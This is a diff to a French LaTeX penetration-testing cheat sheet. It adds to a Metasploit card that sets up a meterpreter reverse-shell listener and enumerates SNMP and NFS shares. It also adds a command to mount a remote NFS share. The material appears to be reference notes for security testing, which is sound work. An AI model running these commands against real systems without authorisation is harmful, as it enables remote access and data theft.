@@ -6177,7 +6177,8 @@ Ici un URL (http://192.168.0.1) est g\'en\'er\'e, si une personne avec un naviga
 \HACKfiche{}{Metasploit - Meterpreter 2/2}{metasploit.png}
 {\O
 }{
-\\Génératation de binairemeterpreter et exploitation.
+\\Génératation de binaire meterpreter et exploitation.\\
+Avec quelques compléments.
 }{
 
 Génération d'un binaire meterpreter :\\
@@ -6190,6 +6191,18 @@ Après exécution sur la machine à distance, se connecter dessus :\\
 \textbf{msf exploit(handler) >}{\sl \color{blue} set LHOST 192.168.0.1}\\
 \textbf{msf exploit(handler) >}{\sl \color{blue} set LPORT 4444}\\
 \textbf{msf exploit(handler) >}{\sl \color{blue} exploit -j}\\
+
+Découverte SNMP avec traitement des OID :\\
+\textbf{msf >} {\sl \color{blue}use auxiliary/scanner/snmp/snmp\_enum}\\
+\textbf{msf auxiliary(snmp\_enum) >}{\sl \color{blue} set RHOSTS 192.168.0.1 192.168.0.2}\\
+
+\'Enumération des partages NFS :\\
+\textbf{msf >} {\sl \color{blue}use auxiliary/scanner/nfs/nfsmount}\\
+\textbf{msf auxiliary(nfsmount) >}{\sl \color{blue} set RHOSTS 192.168.0.1 192.168.0.2}\\
+
+Monter un partage NFS :\\
+{\sl \color{blue}mount -t nfs 192.168.0.1:/partage /media/nfs}\\
+
 }
 
 
